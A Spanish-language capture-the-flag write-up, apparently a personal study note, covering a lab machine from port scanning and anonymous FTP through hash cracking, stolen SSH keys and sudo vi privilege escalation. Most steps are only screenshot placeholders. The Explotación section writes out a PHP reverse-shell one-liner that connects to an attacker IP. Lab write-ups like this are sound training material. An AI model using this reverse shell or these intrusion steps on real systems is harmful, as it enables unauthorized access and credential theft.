---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzaremos haciendo un escaneo de puertos abiertos.

!**Pasted image 20260328200714.png**

Ahora vamos a escanear estos puertos más a fondo.

!**Pasted image 20260328203205.png**

En todos los puertos siguientes sale la misma pista: que no está ahí. Así que vamos a listar directorios de la web.

!**Pasted image 20260328203430.png**

Vamos a ver qué es la página web.

!**Pasted image 20260328203449.png**

Un portal de login, aparentemente.

-----------------------------------
<h2>Profundización</h2>
Vamos a ver qué hay en los archivos que hemos encontrado.

!**Pasted image 20260328203540.png**

Parece una caja para introducir comandos y ejecutarlos.

Vamos a ver el otro archivo.

!**Pasted image 20260328203709.png**

Es un script php inseguro, puede que se use el mismo para el otro.

Ahora vamos por partes, lo primero será investigar lo del anonymous login por FTP.

!**Pasted image 20260328203816.png**

Es una foto (aparentemente), vamos a ver si contiene algo.

!**Pasted image 20260328203939.png**

Vamos a ver qué hemos extraído.

!**Pasted image 20260328204013.png**

Una cadena muy larga en base64, vamos a decodearla.

!**Pasted image 20260328204108.png**

Parece el `/etc/shadow` de alguna máquina. Sabiendo que tenemos al usuario `charlie` y su hash, vamos a intentar crackearlo.

!**Pasted image 20260328204758.png**

Con esta contraseña vamos a intentar iniciar sesión primero en el panel de la página web y si no funciona por SSH.

!**Pasted image 20260328204909.png**

Iniciar sesión nos lleva directamente al panel de introducir comando, que ya habíamos visto antes. Vamos a intentar iniciar sesión por SSH.

!**Pasted image 20260328205013.png**

-------------------------------------
<h2>Explotación</h2>
Como no podemos iniciar sesión por SSH vamos a aprovecharnos de la ejecución de comandos para obtener una reverse shell.

!**Pasted image 20260328205242.png**

Con el comando `php -r '$sock=fsockopen("192.168.128.67",4444);exec("bash <&3 >&3 2>&3");'` obtenemos una shell. Primero voy a estabilizarla.

!**Pasted image 20260328205350.png**

Ahora vamos a ver si podemos leer la flag del usuario.

De primeras no vemos una flag pero vemos algo interesante también, hay un archivo llamado key_rev_key. Vamos a descargarlo desde nuestra máquina.

!**Pasted image 20260328205955.png**

Vamos a mirar a ver qué contiene.

!**Pasted image 20260328210041.png**

Parece que hemos encontrado la clave que nos pedían. Seguimos buscando la flag.

!**Pasted image 20260328210157.png**

Ahora nos toca encontrar la forma de pivotar hacia charlie.

!**Pasted image 20260328210229.png**

El usuario `www-data` está en el grupo `root`, `sudo` y `lxd`, esto nos puede servir para escalar privilegios.

Podemos ver en el directorio `/home` de `charlie` que hay dos archivos `teleport` y `teleport.pub`, esto huele a claves privada y pública.

!**Pasted image 20260328211900.png**

Vamos a usar esta clave para iniciar sesión por SSH.

!**Pasted image 20260328212007.png**

Ahora que ya estamos dentro de la máquina vamos a leer la flag de usuario.

!**Pasted image 20260328212120.png**

------------------------------------
<h2>Escalada de Privilegios</h2>
Ahora toca escalar privilegios para conseguir la flag de root. Lo primero que haremos será ver los grupos a los que pertenece `charlie`.

!**Pasted image 20260328212157.png**

Vamos ahora a completar nuestra checklist de privesc y si nada funciona volveremos a esto.

!**Pasted image 20260328212237.png**

Parece que podemos ejecutar `vi` con sudo. Miramos en GTFOBins.

!**Pasted image 20260328213022.png**

Usamos dicho comando.

!**Pasted image 20260328213003.png**

Acabamos de ganar acceso root. Vamos a leer la flag.

!**Pasted image 20260328213120.png**

Parece que necesitamos la clave, vamos a ejecutarlo.

!**Pasted image 20260328213815.png**

Como no funciona por algún motivo, voy a buscar un desencriptador de Fernet online.

!**Pasted image 20260328213942.png**

Y así obtenemos la segunda flag.

----------------------------------
<h2>Conclusión</h2>
Una máquina divertida pero con algunos errores aparentes. Parece que se podía acceder a la página de los comandos sin necesitar del login, por lo que no habría que acceder a FTP con `anonymous` ni crackear el hash de `charlie`.

>[!SUCCESS] Hemos conseguido obtener ambas flags.

